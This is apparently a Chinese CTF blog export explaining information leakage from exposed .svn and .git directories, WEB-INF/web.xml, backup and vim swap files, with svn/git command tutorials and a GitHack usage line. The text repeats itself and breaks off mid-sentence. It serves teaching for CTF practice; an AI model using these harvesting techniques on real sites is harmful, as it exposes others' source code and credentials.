Subversion系统的版本控制信息文件，当某个目录处于subversion的版本控制i时，在这个目录中就会.svn这个文件夹，这个.svn文件夹中的文件就是一些版本信息文件。</p>\n<p>黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）</p>\n<p>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。</p>\n<p><strong>系统中没有Subversion的情况下：</strong>手工查找。</p>\n<p>多半是去寻找项目的源代码，那么就去寻找<strong>以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录）</strong>，或者也可以先读一读entries文件，直接用记事本打开就行，如果方法得当，就能节省不少时间。</p>\n<p><strong>系统中有Subversion的情况下：</strong>先用命令查找一遍</p>\n<ul>\n<li><strong>svn log:</strong> 用来展示svn 的版本作者、日期、路径等等。</li>\n<li><strong>svn diff:</strong> 用来显示特定修改的行级详细信息。</li>\n<li><strong>svn cat:</strong> 取得在特定版本的某文件显示在当前屏幕。</li>\n<li><strong>svn list:</strong> 显示一个目录或某一版本存在的文件。</li>\n</ul>\n<hr>\n<h3 id=\"1、svn-log\"><a href=\"#1、svn-log\" class=\"headerlink\" title=\"1、svn log\"></a>1、svn log</h3><p>可以显示所有的信息，如果只希望查看特定的某两个版本之间的信息，可以使用：</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn log -r 6:8\n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html second\n------------------------------------------------------------------------\nr8 | user01 | 2016-11-07 02:53:13 +0800 (Mon, 07 Nov 2016) | 1 line\n\nSVN readme.\n------------------------------------------------------------------------</code></pre><p>如果只想查看某一个文件的版本修改信息，可以使用 <strong>svn log</strong> 文件路径。</p>\n<pre><code>root@runoob:~/svn/runoob01# svn log trunk/HelloWorld.html \n------------------------------------------------------------------------\nr7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html second\n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line\n\n\n------------------------------------------------------------------------\nr4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 line\n\nAdd function to accept input and to display array contents\n------------------------------------------------------------------------\nr3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line\n\n\n------------------------------------------------------------------------\nr2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 line\n\nfirst file\n------------------------------------------------------------------------</code></pre><p>如果希望得到目录的信息要加 <strong>-v</strong>。</p>\n<p>如果希望显示限定N条记录的目录信息，使用 <code>svn log -l N -v</code>。</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn log -l 5 -v \n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\n\n------------------------------------------------------------------------\nr4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\nAdd function to accept input and to display array contents\n------------------------------------------------------------------------\nr3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   A /trunk/HelloWorld.html (from /trunk/helloworld.html:2)\n   D /trunk/helloworld.html\n\n\n------------------------------------------------------------------------\nr2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 line\nChanged paths:\n   A /trunk/helloworld.html\n\nfirst file\n------------------------------------------------------------------------</code></pre><hr>\n<h3 id=\"2、svn-diff\"><a href=\"#2、svn-diff\" class=\"headerlink\" title=\"2、svn diff\"></a>2、svn diff</h3><p>用来检查历史修改的详情。</p>\n<ul>\n<li>检查本地修改</li>\n<li>比较工作拷贝与版本库</li>\n<li>比较版本库与版本库</li>\n</ul>\n<p><strong>（1）、如果用 svn diff，不带任何参数，它将会比较你的工作文件与缓存在 .svn 的”原始”拷贝。</strong></p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn diff\nIndex: rules.txt\n===================================================================\n--- rules.txt (revision 3)\n+++ rules.txt (working copy)\n@@ -1,4 +1,5 @@\nBe kind to others\nFreedom = Responsibility\nEverything in moderation\n-Chew with your mouth open</code></pre><p><strong>（2）、比较工作拷贝和版本库</strong></p>\n<p>比较你的工作拷贝和版本库中版本号为 3 的文件 rule.txt。</p>\n<pre><code>svn diff -r 3 rule.txt</code></pre><p><strong>（3）、比较版本库与版本库</strong></p>\n<p>通过 -r(revision) 传递两个通过冒号分开的版本号，这两个版本会进行比较。</p>\n<p>比较 svn 工作版本中版本号2和3的这个文件的变化。</p>\n<pre><code>svn diff -r 2:3 rule.txt</code></pre><hr>\n<h3 id=\"3、svn-cat\"><a href=\"#3、svn-cat\" class=\"headerlink\" title=\"3、svn cat\"></a>3、svn cat</h3><p>如果只是希望检查一个过去版本，不希望查看他们的区别，可使用svn cat</p>\n<pre><code>svn cat -r 版本号 rule.txt</code></pre><p>这个命令会显示在该版本号下的该文件内容</p>\n<hr>\n<h3 id=\"4、svn-list\"><a href=\"#4、svn-list\" class=\"headerlink\" title=\"4、svn list\"></a>4、svn list</h3><p>s<strong>vn list</strong> 可以在不下载文件到本地目录的情况下来察看目录中的文件：</p>\n<pre><code>$ svn list http://192.168.0.1/runoob01\nREADME\nbranches/\nclients/\ntags/</code></pre><h3 id=\"SVN-版本回退\"><a href=\"#SVN-版本回退\" class=\"headerlink\" title=\"SVN 版本回退\"></a>SVN 版本回退</h3><hr>\n<p>当我们想放弃对文件的修改，可以使用 <strong>SVN revert</strong> 命令。</p>\n<p>svn revert 操作将撤销任何文件或目录里的局部更改。</p>\n<p>我们对文件 readme 进行修改,查看文件状态。</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn status\nM       readme</code></pre><p>这时我们发现修改错误，要撤销修改，通过 svn revert 文件 readme 回归到未修改状态。</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn revert readme \nReverted 'readme'</code></pre><p>再查看状态。</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn status \nroot@runoob:~/svn/runoob01/trunk# </code></pre><p>进行 revert 操作之后，readme 文件恢复了原始的状态。 revert 操作不单单可以使单个文件恢复原状， 而且可以使整个目录恢复原状。恢复目录用 -R 命令，如下。</p>\n<pre><code>svn revert -R trunk</code></pre><p>但是，假如我们想恢复一个已经提交的版本怎么办。</p>\n<p>为了消除一个旧版本，我们必须撤销旧版本里的所有更改然后提交一个新版本。这种操作叫做 reverse merge。</p>\n<p>首先，找到仓库的当前版本，现在是版本 22，我们要撤销回到之前的版本，比如版本 21。</p>\n<pre><code>svn merge -r 22:21 readme </code></pre><h2 id=\"git文件\"><a href=\"#git文件\" class=\"headerlink\" title=\".git文件\"></a>.git文件</h2><p>Git泄露上一篇博客将得挺清楚了，一般ctf中会遇到的问题都有了，如果将来写题遇到什么有趣的、有用的东西再记录一下，这里贴一些git常用命令吧，也是实用的东西。</p>\n<p><strong>创建分支命令：</strong></p>\n<pre><code>git branch (branchname)            //创建一个叫branchname的分支</code></pre><p><strong>列出分支命令：</strong></p>\n<pre><code>git branch</code></pre><p>没有参数时，<code>git branch</code> 会列出你在本地的分支。</p>\n<pre><code>$ git branch\n* master</code></pre><p>此例的意思就是，我们有一个叫做 <strong>master</strong> 的分支，并且该分支是当前分支。</p>\n<p>当你执行 <strong>git init</strong> 的时候，默认情况下 Git 就会为你创建 <strong>master</strong> 分支。</p>\n<p><strong>切换分支命令:</strong></p>\n<pre><code>git checkout (branchname)</code></pre><p>当你切换分支的时候，Git 会用该分支的最后提交的快照替换你的工作目录的内容， 所以多个分支不需要多个目录。</p>\n<p>上一篇提到了一个<code>git checkout-index</code>命令，就是将index索引中的文件”切换“出来，切换到当前工作目录。</p>\n<p><strong>合并分支命令:</strong></p>\n<pre><code>git merge </code></pre><p>一旦某分支有了独立内容，你终究会希望将它合并回到你的主分支。</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ <span class=\"token function\">git</span> branch\n* master\n  newtest\n$ <span class=\"token function\">ls</span>\nREADME        test.txt\n$ <span class=\"token function\">git</span> merge newtest\nUpdating 3e92c19<span class=\"token punctuation\">..</span>c1501a2\nFast-forward\n xxx.php <span class=\"token operator\">|</span> 0\n test.txt   <span class=\"token operator\">|</span> 1 -\n 2 files changed, 1 deletion<span class=\"token punctuation\">(</span>-<span class=\"token punctuation\">)</span>\n create mode 100644 xxx.php\n delete mode 100644 test.txt\n$ <span class=\"token function\">ls</span>\nREADME        xxx.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>以上实例中我们将 newtest 分支合并到主分支去，test.txt 文件被删除。</p>\n<p>合并完后就可以删除分支:</p>\n<p><strong>删除分支命令：</strong></p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> branch -d <span class=\"token punctuation\">(</span>branchname<span class=\"token punctuation\">)</span>        //删除名为branchname的分支<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<pre><code>$ git branch -d newtest\nDeleted branch newtest (was c1501a2).</code></pre><p>删除后， 就只剩下 master 分支了：</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ <span class=\"token function\">git</span> branch\n* master<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"WEB-INF-web-xml\"><a href=\"#WEB-INF-web-xml\" class=\"headerlink\" title=\"WEB-INF/web.xml\"></a>WEB-INF/web.xml</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p>\n<pre><code> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 \n\n  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中   \n\n  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件  \n\n  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n\n  /WEB-INF/database.properties：数据库配置文件\n</code></pre><p>漏洞成因：</p>\n<p>​    通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>\n<p><strong>漏洞检测以及利用方法</strong>：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>\n<p>但是具体情况具体分析，实际场景下还是要尽量发挥随机应变的能力。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"版本控制系统信息泄露分析\"><a href=\"#版本控制系统信息泄露分析\" class=\"headerlink\" title=\"版本控制系统信息泄露分析\"></a>版本控制系统信息泄露分析</h1><h2 id=\"svn文件\"><a href=\"#svn文件\" class=\"headerlink\" title=\".svn文件\"></a>.svn文件</h2><p>.svn文件是 Subversion系统的版本控制信息文件，当某个目录处于subversion的版本控制i时，在这个目录中就会.svn这个文件夹，这个.svn文件夹中的文件就是一些版本信息文件。</p>\n<p>黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）</p>\n<p>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。</p>\n<p><strong>系统中没有Subversion的情况下：</strong>手工查找。</p>\n<p>多半是去寻找项目的源代码，那么就去寻找<strong>以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录）</strong>，或者也可以先读一读entries文件，直接用记事本打开就行，如果方法得当，就能节省不少时间。</p>\n<p><strong>系统中有Subversion的情况下：</strong>先用命令查找一遍</p>\n<ul>\n<li><strong>svn log:</strong> 用来展示svn 的版本作者、日期、路径等等。</li>\n<li><strong>svn diff:</strong> 用来显示特定修改的行级详细信息。</li>\n<li><strong>svn cat:</strong> 取得在特定版本的某文件显示在当前屏幕。</li>\n<li><strong>svn list:</strong> 显示一个目录或某一版本存在的文件。</li>\n</ul>\n<hr>\n<h3 id=\"1、svn-log\"><a href=\"#1、svn-log\" class=\"headerlink\" title=\"1、svn log\"></a>1、svn log</h3><p>可以显示所有的信息，如果只希望查看特定的某两个版本之间的信息，可以使用：</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn log -r 6:8\n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html second\n------------------------------------------------------------------------\nr8 | user01 | 2016-11-07 02:53:13 +0800 (Mon, 07 Nov 2016) | 1 line\n\nSVN readme.\n------------------------------------------------------------------------</code></pre><p>如果只想查看某一个文件的版本修改信息，可以使用 <strong>svn log</strong> 文件路径。</p>\n<pre><code>root@runoob:~/svn/runoob01# svn log trunk/HelloWorld.html \n------------------------------------------------------------------------\nr7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html second\n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line\n\n\n------------------------------------------------------------------------\nr4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 line\n\nAdd function to accept input and to display array contents\n------------------------------------------------------------------------\nr3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line\n\n\n------------------------------------------------------------------------\nr2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 line\n\nfirst file\n------------------------------------------------------------------------</code></pre><p>如果希望得到目录的信息要加 <strong>-v</strong>。</p>\n<p>如果希望显示限定N条记录的目录信息，使用 <code>svn log -l N -v</code>。</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn log -l 5 -v \n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\n\n------------------------------------------------------------------------\nr4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\nAdd function to accept input and to display array contents\n------------------------------------------------------------------------\nr3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   A /trunk/HelloWorld.html (from /trunk/helloworld.html:2)\n   D /trunk/helloworld.html\n\n\n------------------------------------------------------------------------\nr2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 line\nChanged paths:\n   A /trunk/helloworld.html\n\nfirst file\n------------------------------------------------------------------------</code></pre><hr>\n<h3 id=\"2、svn-diff\"><a href=\"#2、svn-diff\" class=\"headerlink\" title=\"2、svn diff\"></a>2、svn diff</h3><p>用来检查历史修改的详情。</p>\n<ul>\n<li>检查本地修改</li>\n<li>比较工作拷贝与版本库</li>\n<li>比较版本库与版本库</li>\n</ul>\n<p><strong>（1）、如果用 svn diff，不带任何参数，它将会比较你的工作文件与缓存在 .svn 的”原始”拷贝。</strong></p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn diff\nIndex: rules.txt\n===================================================================\n--- rules.txt (revision 3)\n+++ rules.txt (working copy)\n@@ -1,4 +1,5 @@\nBe kind to others\nFreedom = Responsibility\nEverything in moderation\n-Chew with your mouth open</code></pre><p><strong>（2）、比较工作拷贝和版本库</strong></p>\n<p>比较你的工作拷贝和版本库中版本号为 3 的文件 rule.txt。</p>\n<pre><code>svn diff -r 3 rule.txt</code></pre><p><strong>（3）、比较版本库与版本库</strong></p>\n<p>通过 -r(revision) 传递两个通过冒号分开的版本号，这两个版本会进行比较。</p>\n<p>比较 svn 工作版本中版本号2和3的这个文件的变化。</p>\n<pre><code>svn diff -r 2:3 rule.txt</code></pre><hr>\n<h3 id=\"3、svn-cat\"><a href=\"#3、svn-cat\" class=\"headerlink\" title=\"3、svn cat\"></a>3、svn cat</h3><p>如果只是希望检查一个过去版本，不希望查看他们的区别，可使用svn cat</p>\n<pre><code>svn cat -r 版本号 rule.txt</code></pre><p>这个命令会显示在该版本号下的该文件内容</p>\n<hr>\n<h3 id=\"4、svn-list\"><a href=\"#4、svn-list\" class=\"headerlink\" title=\"4、svn list\"></a>4、svn list</h3><p>s<strong>vn list</strong> 可以在不下载文件到本地目录的情况下来察看目录中的文件：</p>\n<pre><code>$ svn list http://192.168.0.1/runoob01\nREADME\nbranches/\nclients/\ntags/</code></pre><h3 id=\"SVN-版本回退\"><a href=\"#SVN-版本回退\" class=\"headerlink\" title=\"SVN 版本回退\"></a>SVN 版本回退</h3><hr>\n<p>当我们想放弃对文件的修改，可以使用 <strong>SVN revert</strong> 命令。</p>\n<p>svn revert 操作将撤销任何文件或目录里的局部更改。</p>\n<p>我们对文件 readme 进行修改,查看文件状态。</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn status\nM       readme</code></pre><p>这时我们发现修改错误，要撤销修改，通过 svn revert 文件 readme 回归到未修改状态。</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn revert readme \nReverted &#39;readme&#39;</code></pre><p>再查看状态。</p>\n<pre><code>root@runoob:~/svn/runoob01/trunk# svn status \nroot@runoob:~/svn/runoob01/trunk# </code></pre><p>进行 revert 操作之后，readme 文件恢复了原始的状态。 revert 操作不单单可以使单个文件恢复原状， 而且可以使整个目录恢复原状。恢复目录用 -R 命令，如下。</p>\n<pre><code>svn revert -R trunk</code></pre><p>但是，假如我们想恢复一个已经提交的版本怎么办。</p>\n<p>为了消除一个旧版本，我们必须撤销旧版本里的所有更改然后提交一个新版本。这种操作叫做 reverse merge。</p>\n<p>首先，找到仓库的当前版本，现在是版本 22，我们要撤销回到之前的版本，比如版本 21。</p>\n<pre><code>svn merge -r 22:21 readme </code></pre><h2 id=\"git文件\"><a href=\"#git文件\" class=\"headerlink\" title=\".git文件\"></a>.git文件</h2><p>Git泄露上一篇博客将得挺清楚了，一般ctf中会遇到的问题都有了，如果将来写题遇到什么有趣的、有用的东西再记录一下，这里贴一些git常用命令吧，也是实用的东西。</p>\n<p><strong>创建分支命令：</strong></p>\n<pre><code>git branch (branchname)            //创建一个叫branchname的分支</code></pre><p><strong>列出分支命令：</strong></p>\n<pre><code>git branch</code></pre><p>没有参数时，<code>git branch</code> 会列出你在本地的分支。</p>\n<pre><code>$ git branch\n* master</code></pre><p>此例的意思就是，我们有一个叫做 <strong>master</strong> 的分支，并且该分支是当前分支。</p>\n<p>当你执行 <strong>git init</strong> 的时候，默认情况下 Git 就会为你创建 <strong>master</strong> 分支。</p>\n<p><strong>切换分支命令:</strong></p>\n<pre><code>git checkout (branchname)</code></pre><p>当你切换分支的时候，Git 会用该分支的最后提交的快照替换你的工作目录的内容， 所以多个分支不需要多个目录。</p>\n<p>上一篇提到了一个<code>git checkout-index</code>命令，就是将index索引中的文件”切换“出来，切换到当前工作目录。</p>\n<p><strong>合并分支命令:</strong></p>\n<pre><code>git merge </code></pre><p>一旦某分支有了独立内容，你终究会希望将它合并回到你的主分支。</p>\n<pre><code class=\"bash\">$ git branch\n* master\n  newtest\n$ ls\nREADME        test.txt\n$ git merge newtest\nUpdating 3e92c19..c1501a2\nFast-forward\n xxx.php | 0\n test.txt   | 1 -\n 2 files changed, 1 deletion(-)\n create mode 100644 xxx.php\n delete mode 100644 test.txt\n$ ls\nREADME        xxx.php</code></pre>\n<p>以上实例中我们将 newtest 分支合并到主分支去，test.txt 文件被删除。</p>\n<p>合并完后就可以删除分支:</p>\n<p><strong>删除分支命令：</strong></p>\n<pre><code class=\"bash\">git branch -d (branchname)        //删除名为branchname的分支</code></pre>\n<pre><code>$ git branch -d newtest\nDeleted branch newtest (was c1501a2).</code></pre><p>删除后， 就只剩下 master 分支了：</p>\n<pre><code class=\"bash\">$ git branch\n* master</code></pre>\n<h2 id=\"WEB-INF-web-xml\"><a href=\"#WEB-INF-web-xml\" class=\"headerlink\" title=\"WEB-INF/web.xml\"></a>WEB-INF/web.xml</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p>\n<pre><code> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 \n\n  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中   \n\n  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件  \n\n  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n\n  /WEB-INF/database.properties：数据库配置文件\n</code></pre><p>漏洞成因：</p>\n<p>​    通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>\n<p><strong>漏洞检测以及利用方法</strong>：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>\n<p>但是具体情况具体分析，实际场景下还是要尽量发挥随机应变的能力。</p>\n"},{"layout":"post","title":"ctf中的信息泄露","date":"2021-01-10T16:00:00.000Z","description":"详解ctf中的信息泄露","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"# 信息泄露总结\n\n## 目录遍历\n\n顾名思义，就是翻找目录。查找目录中的有用信息。一般来说要结合dirsearch或御剑等工具来进行查找。\n\n## phpinfo\n\n在可以“有限”地执行php命令地地方执行phpinfo()函数，可以得到服务器php配置的信息，比如：环境变量，可用模块，网站绝对路径，服务器操作系统，使用的组件等，为之后的操作提供思路和帮助。\n\n## 备份文件下载\n\n### 网站源码泄露\n\n当开发人员在线上环境中对源代码进行了备份操作，并且不小心将备份文件放在了 web 目录下，就会引起网站源码泄露。\n\n常见的的文件名：\n\nwww\n\nwwwroot\n\nback\n\nbackup\n\nweb\n\nwebsite\n\ntemp\n\n常见的后缀：\n\nzip\n\nrar\n\ntar\n\ntar.gz\n\n### bak文件\n\n有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个或某部分文件的源代码。\n\n即：文件名后面加后缀 .bak\n\n### vim缓存\n\n当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。\n\n \n\n非正常关闭vim编辑器时会生成一个.swp文件\n\n在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。\n\n以 index.php 为例：\n\n第一次产生的交换文件名为 .index.php.swp\n\n再次意外退出后，将会产生名为 .index.php.swo 的交换文件\n\n第三次产生的交换文件则为 .index.php.swn。\n\n可以放到linux系统中使用vim工具加参数 -r修复此备份文件并打开\n\n### .DS_Store文件\n\n.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。\n\n**通过.DS_Store可以知道这个目录里面所有文件的清单。**\n\n.DS_Store可以直接使用记事本打开，但是打开后乱码居多；也可以使用 Python-dsstore 这个工具 (https://github.com/gehaxelt/Python-dsstore)  来完成 .DS_Store 文件的解析，直观一些。\n\n\n\n## 版本控制系统有关的泄露（Git、SVN、HG）\n\n### 版本控制系统\n\n集中式版本控制系统：Subversion(SVN)、CVS、VSS 等。\n分布式版本控制系统：Git、Mercurial(Hg) 等。\n\n对于各个版本控制系统的区别的分析介绍:https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html\n\n## Git泄露\n\n漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。\n\n\n1.漏洞利用：工具：GitHack （https://github.com/BugScanTeam/GitHack） 或 dvcs-ripper （https://github.com/kost/dvcs-ripper）\n\n**GitHack**\n\n使用方法：\n\n```\npython2 GitHack.py URL/.git/\n```\n\n**dvcs-ripper**\n\n使用方法:\n\nExample run (for 